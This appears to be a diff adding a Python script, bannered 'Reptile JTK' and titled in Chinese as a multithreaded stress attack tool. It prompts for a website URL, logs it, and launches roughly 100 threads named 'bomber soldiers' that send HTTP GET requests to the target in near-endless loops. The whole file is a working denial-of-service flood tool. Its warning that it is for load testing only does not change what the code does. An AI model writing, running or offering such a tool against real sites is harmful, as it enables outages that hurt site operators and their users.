@@ -1,0 +1,153 @@
+# -*- coding:utf-8 -*-
+import datetime
+import time
+import requests
+import re
+import os
+import threading
+import _thread
+import queue
+# 导入urlopen
+from urllib.request import urlopen
+# 导入BeautifulSoup
+from bs4 import BeautifulSoup as bf
+# 导入urlretrieve函数，用于下载图片
+from urllib.request import urlretrieve
+# 获得当前时间
+now = datetime.datetime.now()
+other_StyleTime = now.strftime("%Y-%m-%d %H:%M:%S")
+Note=open("use/Reptile.txt",mode='a')
+Note.write('\n时间:['+other_StyleTime)
+Note.write(']---root用户使用了 多线程压力功击\n')
+Note.close()
+print ("\033[1;33;40m ")
+
+print("____            _   _ _            _ _____ _  __")
+print("|  _ \ ___ _ __ | |_(_) | ___      | |_   _| |/ /")
+print("| |_) / _ \ '_ \| __| | |/ _ \  _  | | | | | ' /")
+print("|  _ <  __/ |_) | |_| | |  __/ | |_| | | | | . \ ")
+print("|_| \_\___| .__/ \__|_|_|\___|  \___/  |_| |_|\_\ ")
+print("           |_|                                   ")
+print("多线程压力攻击")
+print("注意！注意！使用时请看这里！该工具仅限用于测试网站压力！而且攻击是极不安全！请勿恶意用于非法攻击网站！金条k将不负任何法律责任！")
+print("线程数量:100\n请保证手机流畅，否则卡顿")
+mc = input("请输入完整的网站: ")
+now = datetime.datetime.now()
+other_StyleTime = now.strftime("%Y-%m-%d %H:%M:%S")
+Note=open("use/Reptile.txt",mode='a')
+Note.write('\n时间:['+other_StyleTime)
+Note.write(']---输入的网站为: %s \n'%(mc))
+Note.close()
+
+def print_time( threadName, delay):
+   count = 0
+   while count < 1000000000:
+      count += 1
+      print(threadName,": 开始第%s波轰炸"%(count))
+      qq = requests.get(mc)
+      
+      
+try:
+   _thread.start_new_thread( print_time, ("轰炸兵_1", 2, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_2", 4, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_3", 6, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_4", 8, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_5", 10, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_6", 12, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_7", 14, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_8", 16, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_10", 17, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_11", 18, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_12", 19, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_13", 20, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_14", 21, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_15", 22, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_16", 23, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_17", 24, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_18", 25, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_19", 26, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_20", 27, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_21", 28, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_22", 29, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_23", 30, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_24", 31, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_25", 32, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_26", 33, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_27", 34, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_29", 35, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_30", 36, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_31", 37, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_32", 38, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_33", 39, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_34", 40, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_35", 41, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_36", 42, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_37", 43, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_38", 44, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_39", 45, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_40", 46, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_41", 47, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_42", 48, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_43", 49, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_44", 50, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_45", 51, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_46", 52, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_47", 53, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_48", 54, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_49", 55, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_50", 56, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_51", 57, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_52", 58, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_53", 59, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_54", 60, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_55", 61, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_56", 62, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_57", 63, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_58", 64, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_59", 65, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_60", 66, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_61", 67, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_62", 68, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_63", 69, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_64", 70, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_65", 71, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_66", 72, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_67", 73, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_68", 74, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_69", 75, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_70", 76, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_71", 77, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_72", 78, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_73", 79, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_74", 80, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_75", 81, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_76", 82, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_77", 83, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_78", 84, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_79", 85, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_80", 86, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_81", 87, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_82", 85, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_83", 86, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_84", 87, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_85", 88, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_86", 89, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_87", 90, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_88", 91, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_89", 92, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_90", 93, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_91", 94, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_92", 95, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_93", 96, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_94", 97, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_95", 98, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_96", 99, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_97", 100, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_98", 101, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_99", 102, ) )
+   _thread.start_new_thread( print_time, ("轰炸兵_100", 103, ) )
+except:
+   print ("Error: 轰炸启动失败")
+while 1:
+   pass
+
